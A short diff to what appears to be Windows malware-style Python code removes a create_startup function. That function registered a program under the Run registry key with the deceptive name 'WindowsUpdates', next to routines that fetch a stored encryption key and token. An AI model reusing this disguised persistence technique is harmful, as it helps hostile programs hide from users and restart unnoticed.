@@ -33,14 +33,6 @@ def get_enc_key():
         reg.CloseKey(k)
     return enc_key
 
-def create_startup(program_path):
-    loc_1 = reg.OpenKeyEx(loc, r"SOFTWARE\\")
-    k = reg.CreateKey(loc_1, "Microsoft\\Windows\\CurrentVersion\\Run")
-    reg.SetValueEx(k, "WindowsUpdates", 0, reg.REG_SZ, f"{program_path}")
-
-    if k:
-        reg.CloseKey(k)
-
 def get_token():
     loc_1 = reg.OpenKeyEx(loc, r"SOFTWARE\\")
     k = reg.OpenKey(loc_1, "WindowsUpdates")
